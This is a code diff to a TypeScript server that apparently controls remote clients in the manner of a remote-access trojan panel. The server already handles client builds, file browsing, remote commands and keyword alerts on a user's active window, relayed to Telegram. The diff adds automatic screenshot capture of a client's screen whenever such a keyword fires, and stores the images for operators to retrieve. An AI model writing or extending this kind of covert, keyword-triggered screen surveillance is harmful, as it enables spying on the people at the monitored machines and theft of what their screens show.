@@ -7,7 +7,7 @@ import { fileURLToPath } from "url";
 import path from "path";
 import fs from "fs/promises";
 import AdmZip from "adm-zip";
-import { upsertClientRow, setOnlineState, listClients, markAllClientsOffline, saveBuild, getBuild, getAllBuilds, deleteExpiredBuilds, deleteBuild } from "./db";
+import { upsertClientRow, setOnlineState, listClients, markAllClientsOffline, saveBuild, getBuild, getAllBuilds, deleteExpiredBuilds, deleteBuild, saveNotificationScreenshot, getNotificationScreenshot, clearNotificationScreenshots } from "./db";
 import { handleFrame, handleHello, handlePing, handlePong } from "./wsHandlers";
 import { ClientInfo, ClientRole } from "./types";
 import { v4 as uuidv4 } from "uuid";
@@ -51,7 +51,7 @@ const CORS_HEADERS = {
 
 
 const SECURITY_HEADERS = {
-  "Content-Security-Policy": "default-src 'self'; script-src 'self' https://cdn.tailwindcss.com https://cdn.jsdelivr.net https://cdnjs.cloudflare.com https://unpkg.com; style-src 'self' 'unsafe-inline' https://cdn.tailwindcss.com https://cdnjs.cloudflare.com https://cdn.jsdelivr.net https://fonts.googleapis.com; img-src 'self' data: https://cdn.jsdelivr.net; font-src 'self' https://cdnjs.cloudflare.com https://cdn.jsdelivr.net https://fonts.gstatic.com; connect-src 'self' wss: ws: https://cdn.jsdelivr.net",
+  "Content-Security-Policy": "default-src 'self'; script-src 'self' https://cdn.tailwindcss.com https://cdn.jsdelivr.net https://cdnjs.cloudflare.com https://unpkg.com; style-src 'self' 'unsafe-inline' https://cdn.tailwindcss.com https://cdnjs.cloudflare.com https://cdn.jsdelivr.net https://fonts.googleapis.com; img-src 'self' data: blob: https://cdn.jsdelivr.net; font-src 'self' https://cdnjs.cloudflare.com https://cdn.jsdelivr.net https://fonts.gstatic.com; connect-src 'self' wss: ws: https://cdn.jsdelivr.net",
   "X-Content-Type-Options": "nosniff",
   "X-Frame-Options": "DENY",
   "X-XSS-Protection": "1; mode=block",
@@ -71,6 +71,7 @@ const ALLOWED_CLIENT_MESSAGE_TYPES = new Set([
   "file_read_result",
   "file_search_result",
   "command_result",
+  "screenshot_result",
   "command_progress",
   "process_list_result",
   "script_result",
@@ -105,6 +106,7 @@ type NotificationRecord = {
   keyword?: string;
   category: "active_window";
   ts: number;
+  screenshotId?: string;
 };
 
 type NotificationRateState = {
@@ -117,6 +119,53 @@ type NotificationRateState = {
 const notificationHistory: NotificationRecord[] = [];
 const notificationRate = new Map<string, NotificationRateState>();
 const getNotificationConfig = () => getConfig().notifications;
+
+type PendingNotificationScreenshot = {
+  notificationId: string;
+  clientId: string;
+  ts: number;
+  timeout: NodeJS.Timeout;
+};
+
+const pendingNotificationScreenshots = new Map<string, PendingNotificationScreenshot>();
+
+function takePendingNotificationScreenshot(clientId: string): PendingNotificationScreenshot | null {
+  for (const [commandId, pending] of pendingNotificationScreenshots.entries()) {
+    if (pending.clientId !== clientId) continue;
+    clearTimeout(pending.timeout);
+    pendingNotificationScreenshots.delete(commandId);
+    return pending;
+  }
+  return null;
+}
+
+function storeNotificationScreenshot(
+  pending: PendingNotificationScreenshot,
+  bytes: Uint8Array,
+  format: string,
+  width?: number,
+  height?: number,
+) {
+  if (!bytes || bytes.length === 0) return;
+  const screenshotId = uuidv4();
+
+
+  saveNotificationScreenshot({
+    id: screenshotId,
+    notificationId: pending.notificationId,
+    clientId: pending.clientId,
+    ts: pending.ts,
+    format,
+    width,
+    height,
+    bytes,
+  });
+
+  const record = notificationHistory.find((item) => item.id === pending.notificationId);
+  if (record) {
+    record.screenshotId = screenshotId;
+  }
+}
 
 async function postNotificationWebhook(record: NotificationRecord): Promise<void> {
   const config = getNotificationConfig();
@@ -180,6 +229,86 @@ async function postTelegramNotification(record: NotificationRecord): Promise<voi
     });
   } catch (err) {
     logger.warn("[notify] telegram delivery failed", err);
+  }
+}
+
+function requestNotificationScreenshot(info: ClientInfo | undefined, record: NotificationRecord) {
+  if (!info || !info.ws) return;
+  const commandId = `notify-shot-${uuidv4()}`;
+  const timeout = setTimeout(() => {
+    pendingNotificationScreenshots.delete(commandId);
+  }, 15_000);
+
+  pendingNotificationScreenshots.set(commandId, {
+    notificationId: record.id,
+    clientId: record.clientId,
+    ts: record.ts,
+    timeout,
+  });
+
+
+  try {
+    info.ws.send(
+      encodeMessage({ type: "command", commandType: "screenshot", id: commandId }),
+    );
+    metrics.recordCommand("screenshot");
+  } catch (err) {
+    clearTimeout(timeout);
+    pendingNotificationScreenshots.delete(commandId);
+    logger.warn("[notify] failed to request screenshot", err);
+  }
+}
+
+function handleNotificationScreenshotFailure(commandId?: string, ok?: boolean, message?: string) {
+  if (!commandId) return;
+  if (ok === true) return;
+  const pending = pendingNotificationScreenshots.get(commandId);
+  if (!pending) return;
+  clearTimeout(pending.timeout);
+  pendingNotificationScreenshots.delete(commandId);
+  if (message) {
+    logger.warn(`[notify] screenshot failed commandId=${commandId} message=${message}`);
+  }
+}
+
+function handleNotificationScreenshotResult(clientId: string, payload: any) {
+  const commandId = typeof payload.commandId === "string" ? payload.commandId : "";
+  if (!commandId) return;
+  const pending = pendingNotificationScreenshots.get(commandId);
+  if (!pending) return;
+  clearTimeout(pending.timeout);
+  pendingNotificationScreenshots.delete(commandId);
+
+  if (payload.error) {
+    logger.warn(`[notify] screenshot error commandId=${commandId}`, payload.error);
+    return;
+  }
+
+  let bytes: Uint8Array | null = null;
+  if (payload.data instanceof Uint8Array) {
+    bytes = payload.data;
+  } else if (payload.data instanceof ArrayBuffer) {
+    bytes = new Uint8Array(payload.data);
+  } else if (ArrayBuffer.isView(payload.data)) {
+    bytes = new Uint8Array(payload.data.buffer);
+  }
+
+  if (!bytes || bytes.length === 0) {
+    logger.warn(`[notify] screenshot missing data commandId=${commandId}`);
+    return;
+  }
+
+  const format = typeof payload.format === "string" ? payload.format : "jpeg";
+  const width = Number(payload.width) || undefined;
+  const height = Number(payload.height) || undefined;
+  storeNotificationScreenshot(pending, bytes, format, width, height);
+}
+
+function clearPendingNotificationScreenshots(clientId: string) {
+  for (const [commandId, pending] of pendingNotificationScreenshots.entries()) {
+    if (pending.clientId !== clientId) continue;
+    clearTimeout(pending.timeout);
+    pendingNotificationScreenshots.delete(commandId);
   }
 }
 
@@ -1404,6 +1533,8 @@ function handleNotification(clientId: string, payload: any) {
     notificationHistory.splice(limit);
   }
 
+  requestNotificationScreenshot(info, record);
+
   for (const session of sessionManager.getAllNotificationSessions().values()) {
     safeSendViewer(session.viewer, { type: "notification", item: record });
   }
@@ -1878,6 +2009,32 @@ async function startServer() {
         });
 
         return Response.json({ ok: true, notifications: updated });
+      }
+
+      const screenshotMatch = url.pathname.match(/^\/api\/notifications\/([^/]+)\/screenshot$/);
+      if (req.method === "GET" && screenshotMatch) {
+        const user = await authenticateRequest(req);
+        if (!user) {
+          return new Response(JSON.stringify({ error: "Not authenticated" }), {
+            status: 401,
+            headers: { "Content-Type": "application/json" },
+          });
+        }
+        const notificationId = decodeURIComponent(screenshotMatch[1]);
+        const screenshot = getNotificationScreenshot(notificationId);
+        if (!screenshot) {
+          return new Response("Not found", { status: 404 });
+        }
+        const format = (screenshot.format || "jpeg").toLowerCase();
+        const contentType = format === "jpg" || format === "jpeg"
+          ? "image/jpeg"
+          : format === "png"
+            ? "image/png"
+            : format === "webp"
+              ? "image/webp"
+              : "application/octet-stream";
+
+        return new Response(screenshot.bytes as unknown as BodyInit, { headers: secureHeaders(contentType) });
       }
 
       
@@ -3399,7 +3556,30 @@ async function startServer() {
               handlePong(info, payload);
               break;
             case "frame":
+              if ((payload as any)?.header?.fps === 0) {
+                const pending = takePendingNotificationScreenshot(info.id);
+                if (pending) {
+                  let bytes: Uint8Array | null = null;
+                  if ((payload as any).data instanceof Uint8Array) {
+                    bytes = (payload as any).data;
+                  } else if ((payload as any).data instanceof ArrayBuffer) {
+                    bytes = new Uint8Array((payload as any).data);
+                  } else if (ArrayBuffer.isView((payload as any).data)) {
+                    bytes = new Uint8Array((payload as any).data.buffer);
+                  }
+
+                  const format = String((payload as any)?.header?.format || "jpeg");
+                  const width = Number((payload as any)?.header?.width) || undefined;
+                  const height = Number((payload as any)?.header?.height) || undefined;
+                  if (bytes) {
+                    storeNotificationScreenshot(pending, bytes, format, width, height);
+                  }
+                }
+              }
               handleFrame(info, payload);
+              break;
+            case "screenshot_result":
+              handleNotificationScreenshotResult(info.id, payload);
               break;
             case "console_output":
               handleConsoleOutput(payload);
@@ -3410,7 +3590,11 @@ async function startServer() {
             case "file_read_result":
             case "file_search_result":
             case "command_result":
-              
+              handleNotificationScreenshotFailure(
+                (payload as any).commandId,
+                (payload as any).ok,
+                (payload as any).message,
+              );
               handleFileBrowserMessage(info.id, payload);
               break;
             case "command_progress":
@@ -3499,6 +3683,7 @@ async function startServer() {
         clientManager.deleteClient(clientId);
         notifyConsoleClosed(clientId, "Client disconnected");
         setOnlineState(clientId, false);
+        clearPendingNotificationScreenshots(clientId);
         logger.info(`[close] ${clientId} code=${code} reason=${reason}`);
         
         
@@ -3511,6 +3696,7 @@ async function startServer() {
 
   
   markAllClientsOffline();
+  clearNotificationScreenshots();
   
   
   deleteExpiredBuilds();
